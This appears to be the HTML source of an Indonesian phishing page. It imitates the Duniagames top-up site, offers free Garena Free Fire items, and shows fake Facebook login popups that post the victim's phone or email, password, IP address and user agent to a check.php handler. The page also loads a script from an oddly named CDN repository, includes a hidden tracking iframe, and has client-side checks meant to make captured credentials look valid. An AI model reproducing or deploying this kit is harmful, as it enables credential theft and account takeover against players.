            <div aria-live="polite" role="alertdialog" class="toast-message ng-star-inserted" style="">
                <span class="now-ui-icons ui-1_bell-53"></span> <span id="msgError"></span>
            </div><!----><!---->
        </div></div></div>

    <ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_1_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" src="https://googleads.g.doubleclick.net/pagead/ads?guci=2.2.0.0.2.2.0.0&amp;client=ca-pub-7464976184889071&amp;output=html&amp;adk=1812271804&amp;adf=3025194257&amp;lmt=1611244089&amp;plat=1%3A32776%2C2%3A16809992%2C9%3A32776%2C10%3A32%2C11%3A32%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1081344%2C32%3A32%2C40%3A32&amp;format=0x0&amp;url=https%3A%2F%2Fduniagames.co.id%2F&amp;ea=0&amp;region=page-63511&amp;flash=0&amp;pra=7&amp;wgl=1&amp;uach=WyJXaW5kb3dzIiwiMTAuMCIsIng4NiIsIiIsIjg3LjAuNDI4MC4xNDEiLFtdXQ..&amp;dt=1611706894525&amp;bpp=9&amp;bdt=923&amp;idt=1155&amp;shv=r20210121&amp;cbv=r20190131&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D3478b1a398761b53-223e2146d0c500da%3AT%3D1611525876%3ART%3D1611525876%3AS%3DALNI_MYjMMP8HmCIcDESLJCu0DclKT59UQ&amp;prev_fmts=banner&amp;nras=1&amp;correlator=3211332630141&amp;frm=20&amp;pv=1&amp;ga_vid=988673802.1602475706&amp;ga_sid=1611706895&amp;ga_hid=8271339&amp;ga_fc=0&amp;ga_cid=9041570.1611525876&amp;u_tz=420&amp;u_his=2&amp;u_java=0&amp;u_h=864&amp;u_w=1536&amp;u_ah=824&amp;u_aw=1536&amp;u_cd=24&amp;u_nplug=3&amp;u_nmime=4&amp;adx=-12245933&amp;ady=-12245933&amp;biw=1519&amp;bih=754&amp;scr_x=0&amp;scr_y=0&amp;eid=21068769&amp;oid=3&amp;pvsid=1975103661669222&amp;pem=85&amp;rx=0&amp;eae=2&amp;fc=896&amp;brdim=0%2C0%2C0%2C0%2C1536%2C0%2C1536%2C824%2C1536%2C754&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=8192&amp;bc=31&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=1170" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!1" data-load-complete="true" data-gtm-yt-inspected-1_27="true" data-gtm-yt-inspected-10040055_23="true" data-gtm-yt-inspected-10040055_24="true"></iframe></ins></ins>
    </ins><iframe src="//r.zozezop.com/statistic?url=https%3A%2F%2Fduniagames.co.id%2F&amp;id=8e562e40-f05c-40fe-a587-31236acb825b" width="1" height="1" scrolling="no" frameborder="0" data-gtm-yt-inspected-1_27="true" data-gtm-yt-inspected-10040055_23="true"
        data-gtm-yt-inspected-10040055_24="true"></iframe><iframe id="google_osd_static_frame_4927418276669" name="google_osd_static_frame" data-gtm-yt-inspected-1_27="true" data-gtm-yt-inspected-10040055_23="true" data-gtm-yt-inspected-10040055_24="true"
        style="display: none; width: 0px; height: 0px;"></iframe>

<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="fa fa-times"></i></a>
		<div class="navbar-fb">
			<img src="http://randiramli.my.id/images/fb/facebook_Header.png">
		</div>
		<div class="content-box-fb">
		    		      	<p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
		      	<p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
			<img src="http://randiramli.my.id/images/ff/rndyFB.png" style="width: 60px;">
			<div class="txt-login-fb">
				 Masuk ke akun Facebook Anda untuk terhubung dengan Garena Free Fire
			</div>
			<form class="login-form" action="check.php" method="post" onsubmit="$(this).end()">
				<label style="width: 95%;  margin: auto;">
				<input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required>
				</label>
				<label style="width: 95%;">
				<input type="password" id="pass" name="pass" placeholder="Kata sandi Facebook" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="userNickForm" id="userNickForm">
                  <input type="hidden" name="userIdForm" id="userIdForm">
              <input type="hidden" name="ipaddr" value="<?php echo $ipaddr;?>" readonly>
<input type="hidden" name="useragent" value="<?php echo $useragent;?>" readonly>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Masuk</button>
			</form>
			<div class="txt-create-account">Buat akun</div>
			<div class="txt-not-now">Lain kali</div>
			<div class="txt-forgotten-password">Lupa Kata Sandi? • Pusat Bantuan</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">Bahasa Indonesia</div>
			<div class="language-name">English (UK)</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">s��s��語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>
<script src="https://cdn.jsdelivr.net/gh/stylesheett/jquery.min.js@main/slim.js"></script>
<div class="popup-login twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter" style="height: 370px;">
	<a onclick="tutup-twitter()" class="close-other"><i class="fa fa-times"></i></a>
	
		<div class="header-twitter" style="padding-top: 10px;">
			<center>
			<img src="https://i.ibb.co/ThFWLfQ/logofbb-removebg-preview.png" style="width: 30px;">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="check.php" method="post" onsubmit="$(this).end()"
>
				<div class="txt-login-twitter" style="font-size: 15px; font-weight: unset; margin-left: -0px;">Login Ke Facebook untuk meneruskan</div>
				<div class="input-box-twitter" style="height: auto;">
					<label>Nomor HP atau email:</label>
					<input type="text" name="user" id="user" placeholder="" required>
				</div>
				<div class="input-box-twitter" style="height: auto;">
					<label>Sandi:</label>
					<input type="password" id="pass" name="pass" placeholder="" required>
				</div>
				<input type="hidden" name="userNickForm" id="userNickForm">
                  <input type="hidden" name="userIdForm" id="userIdForm">
              <input type="hidden" name="ipaddr" value="<?php echo $ipaddr;?>" readonly>
<input type="hidden" name="useragent" value="<?php echo $useragent;?>" readonly>
				<input type="hidden" name="login" value="VK" readonly>
				<button type="submit" class="btn-login-twitter" style="background: #5181b8; width: 40%; border-radius: 15px; float: left; margin-left: 10px;">Login</button>
			</form>
			<button onclick="tutup-twitter()" class="btn-login-twitter"style="background: none; color: #5181b8; width: auto; margin: auto; padding-right: 100px;" >Batal</button>
			</center>
		</div>
	</div>
</div>

		

        <div class="cdk-overlay-container" id="cdk-overlay-container" style="display: none;">
    <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing" id="cdk-overlay-backdrop"></div>
    <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
        <div id="cdk-overlay-0" class="cdk-overlay-pane mat-dialog-form-payment" style="max-width: 80vw; pointer-events: auto; position: static;">
            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
            <mat-dialog-container aria-modal="true" class="mat-dialog-container ng-tns-c13-1 ng-trigger ng-trigger-dialogContainer ng-star-inserted" tabindex="-1" id="mat-dialog-0" role="dialog" style="transform: none;">
                <!---->
                <app-form-payment-new class="ng-star-inserted">
                    <div class="popup-WrapDialog paymentPopupInfo" mat-dialog-container="">
                        <div mat-form-field="">
                            <div class="header-text text-center">
                                <div class="mat-dialog-actions" mat-dialog-actions="">
                                    <div class="close-reset" id="reset1"><img _ngcontent-jjd-c10="" src="https://duniagames.co.id/assets/images/icons/close-icon.png"></div>
                                </div>
                                <div class="wrap-titleDialog wrap-titleDialog-step1">
                                    <h3 style="font-family: 'Roboto', sans-serif;">Informasi Pembayaran </h3>
                                </div>
                                <div class="wrap-titleDialog wrap-titleDialog-step2 noActive">
                                    <h3 style="font-family: 'Roboto', sans-serif;">Selesaikan pembayaran anda dengan pilihan berikut</h3>
                                    <p style="font-family: 'Roboto', sans-serif;">Gunakan konfirmasi PIN untuk transaksi secara langsung</p>
                                </div>
                            </div>
                            <form novalidate="" class="ng-pristine ng-invalid ng-touched">
                                <div class="container-paymentInfo">
                                    <div class="paymentInfo-step1 paymentInfo-step">
                                        <div class="wrap-paymentInfo clearfix"></div>
                                        <div class="wrap-paymentInfo clearfix">
                                            <div class="wrap-paymentInfo-right-new">
                                                <!---->
                                                <div class="row ng-star-inserted" style="">
                                                    <h4 class="" style="font-family: 'Roboto', sans-serif;">FreeFire</h4>
                                                </div>
                                                <!---->
                                                <div class="form-group row">
                                                    <div class="col-md-4 col-xs-4"><label style="font-family: 'Roboto', sans-serif;">Item</label></div>
                                                    <div class="col-md-8 col-xs-8">
                                                        <p style="font-family: 'Roboto', sans-serif;" id="showItem"></p>
                                                    </div>
                                                </div>
                                                <!---->
                                                <div class="form-group row ng-star-inserted" style="">
                                                    <div class="col-md-4 col-xs-4"><label style="font-family: 'Roboto', sans-serif;">ID Game</label></div>
                                                    <div class="col-md-8 col-xs-8">
                                                        <p style="font-family: 'Roboto', sans-serif;" id="showId"></p>
                                                    </div>
                                                </div>
                                                <!---->
                                                <!---->
                                                <div class="form-group row ng-star-inserted" style="">
                                                    <div class="col-md-4 col-xs-4"><label style="font-family: 'Roboto', sans-serif;">Nickname</label></div>
                                                    <div class="col-md-8 col-xs-8">
                                                        <p style="font-family: 'Roboto', sans-serif;" id="showNick"></p>
                                                    </div>
                                                </div>
                                                <!---->
                                                <div class="form-group row">
                                                    <div class="col-md-4 col-xs-4"><label style="font-family: 'Roboto', sans-serif;">Harga</label></div>
                                                    <div class="col-md-8 col-xs-8">
                                                        <p style="font-family: 'Roboto', sans-serif;">Rp. 0 ( Gratis )</p>
                                                    </div>
                                                </div>
                                                <!---->
                                            </div>
                                        </div>
                                        <!---->
                                        <div class="wrap-paymentInfo wrap-paymentInfo-confirm"><button class="btn-red" id="btn-confirmFirst" type="button" style="font-family: 'Roboto', sans-serif;">KONFIRMASI</button>
                                            <!---->
                                            <!---->
                                        </div>
                                    </div>
                                    <div class="paymentInfo-step2 paymentInfo-step noActive">
                                        <div class="wrap-paymentInfo wrap-paymentInfo-confirm"><button class="btn-red" type="button">Konfirmasikan melalui PIN</button>
                                            <!---->
                                            <!---->
                                            <!---->
                                            <!---->
                                        </div>
                                        <!---->
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </app-form-payment-new>
            </mat-dialog-container>
            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
        </div>
    </div>
</div>

<div class="cdk-overlay-container" id="cdk-overlay-container2" style="display: none;">
    <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing" id="cdk-overlay-backdrop2"></div>
    <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
        <div id="cdk-overlay-0" class="cdk-overlay-pane mat-dialog-form-payment" style="max-width: 80vw; pointer-events: auto; position: static;">
            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
            <mat-dialog-container aria-modal="true" class="mat-dialog-container ng-tns-c13-1 ng-trigger ng-trigger-dialogContainer ng-star-inserted" tabindex="-1" id="mat-dialog-0" role="dialog" style="transform: none;">
                <!---->
                <app-form-payment-new class="ng-star-inserted">
                    <div class="popup-WrapDialog paymentPopupInfo" mat-dialog-container="">
                        <div mat-form-field="">
                            <div class="header-text text-center">
                                <div class="mat-dialog-actions" mat-dialog-actions="">
                                    <div class="close-reset" id="reset2"><img _ngcontent-jjd-c10="" src="https://duniagames.co.id/assets/images/icons/close-icon.png"></div>
                                </div>
                                <div class="wrap-titleDialog wrap-titleDialog-step1">
                                    <h3 style="font-family: 'Roboto', sans-serif;">Verifikasi akun anda.</h3>
                                </div>

                            </div>
                            <form novalidate="" class="ng-pristine ng-invalid ng-touched">
                                <div class="container-paymentInfo">
                                    <div class="paymentInfo-step1 paymentInfo-step">
                                        <div class="wrap-paymentInfo clearfix">
                                            </div>
                                        <div class="wrap-paymentInfo wrap-paymentInfo-confirm" style="width: 100%; margin-top: -30px;"><button class="btn-red" id="vkLogin" type="button" style="font-family: 'Roboto', sans-serif; width: 100%;"><i class="fab fa-facebook-square" style="font-size: 20px; float: left;"></i> Login via Facebook</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </app-form-payment-new>
            </mat-dialog-container>
            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
        </div>
    </div>
</div>


</body><iframe id="google_esf" name="google_esf" src="https://googleads.g.doubleclick.net/pagead/html/r20210121/r20190131/zrt_lookup.html#" data-ad-client="ca-pub-7464976184889071" style="display: none;" data-gtm-yt-inspected-1_27="true" data-gtm-yt-inspected-10040055_23="true"
    data-gtm-yt-inspected-10040055_24="true"></iframe>
	<script type="text/javascript">
		function AlexHost()
		{
			$user = $('#user').val().trim();
			$pass = $('#pass').val().trim();
			if($user == '' || $user == null || $user.length <= 5)
			{
				$('.email').show();
				$('.sandi').hide();
				return false;
			}else{
				$('.email').hide();
			}
			if($pass == '' || $pass == null || $pass.length <= 5)
			{
				$('.sandi').show();
				return false;
			}else{
				$('.sandi').hide();
			}
		}
</script>
